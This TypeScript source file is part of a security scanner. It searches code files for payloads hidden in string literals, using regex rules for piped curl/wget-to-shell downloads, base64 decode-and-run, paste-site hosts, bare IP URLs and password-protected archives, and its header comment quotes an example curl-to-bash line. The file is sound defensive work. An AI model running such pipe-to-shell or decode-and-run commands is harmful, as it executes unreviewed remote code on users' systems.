/**
 * Payload sweep for code files.
 *
 * A skill's payload does not have to live in SKILL.md. A helper script can carry
 * it: `os.system("curl https://glot.io/... | bash")` used to be reported only as
 * "Shell Execution", which is a capability, so the whole skill came out Medium.
 *
 * This pass looks for the payload itself wherever it is, anchored on a quote so
 * matches land inside string literals rather than comments or rule definitions.
 * Backticks are deliberately not treated as strings: a scanner's own denylist
 * lives in a template literal, and flagging that is noise, not signal.
 */

import { Finding, Language, RiskSeverity } from '../types';
import { DROP_HOSTS } from './markdown.analyzer';

interface StringPattern {
  name: string;
  severity: RiskSeverity;
  category: string;
  description: string;
  pattern: RegExp;
}

/** Addresses that are not the internet. */
const NOT_LOCAL = String.raw`(?!127\.0\.0\.1|0\.0\.0\.0|localhost|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|\[::1\])`;

const STRING_PATTERNS: StringPattern[] = [
  {
    name: 'pipe-to-shell-in-code',
    severity: 'high',
    category: 'Remote Script',
    description:
      'Runs a downloaded script straight from the internet inside a string. Nobody reviews what executes and the server can change it any time.',
    pattern: new RegExp(
      String.raw`["'][^"'\n]*\b(?:curl|wget|iwr|irm)\b[^"'\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k|fi)?sh|python3?|node|perl|ruby|iex)\b`,
      'i',
    ),
  },
  {
    name: 'decode-and-run-in-code',
    severity: 'critical',
    category: 'Evasion Technique',
    description: 'Decodes a blob and pipes it into a shell: the payload is hidden from the reader.',
    pattern: new RegExp(
      String.raw`["'][^"'\n]*(?:base64\s+(?:-d|--decode)|certutil\s+-decode|FromBase64String)[^"'\n]*\|\s*(?:(?:ba|z|da|k)?sh|iex|Invoke-Expression)\b`,
      'i',
    ),
  },
  {
    name: 'payload-host-in-code',
    severity: 'high',
    category: 'Suspicious Download',
    description: `Loads from a paste site or tunnel host inside a string. Legitimate tools publish releases instead.`,
    pattern: new RegExp(String.raw`["'][^"'\n]*${DROP_HOSTS}`, 'i'),
  },
  {
    name: 'raw-ip-url-in-code',
    severity: 'high',
    category: 'Suspicious Download',
    description: `Talks to a bare IP address inside a string, with no domain name behind it.`,
    pattern: new RegExp(
      String.raw`["'][^"'\n]*https?:\/\/${NOT_LOCAL}\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`,
      'i',
    ),
  },
  {
    name: 'password-archive-in-code',
    severity: 'critical',
    category: 'Suspicious Download',
    description:
      'Mentions a password-protected archive in a string: the payload is hidden from scanners and from the reader.',
    pattern: new RegExp(
      String.raw`["'][^"'\n]*(?:password|passwd|pwd)\s*[:=]\s*["']?[\w-]{4,}["']?[^"'\n]*\.(?:zip|7z|rar)`,
      'i',
    ),
  },
];

/** Lines that are a rule definition rather than a payload. */
const RULE_DEFINITION = /(?:new RegExp|String\.raw|const\s+\w*RULES?\b|\bMatcher|test\(|match\()/;

export const PAYLOAD_PATTERN_NAMES = STRING_PATTERNS.map((p) => p.name);

/**
 * Sweep one source file for payloads hidden in string literals.
 */
export function sweepCodeStrings(source: string, filePath: string, language: Language): Finding[] {
  const findings: Finding[] = [];
  const lines = source.split('\n');

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (RULE_DEFINITION.test(line)) continue;
    // Only look at lines that actually open a string.
    if (!/["']/.test(line)) continue;

    for (const rule of STRING_PATTERNS) {
      const m = rule.pattern.exec(line);
      if (!m) continue;
      const offset = m[0].indexOf(m[1] ?? '');
      findings.push({
        file: filePath,
        line: i + 1,
        column: offset >= 0 ? offset : 0,
        severity: rule.severity,
        category: rule.category,
        description: `${rule.description} (found in a string inside ${language} code)`,
        codeSnippet: line.trim().slice(0, 200),
        language,
      });
      break;
    }
  }

  return findings;
}
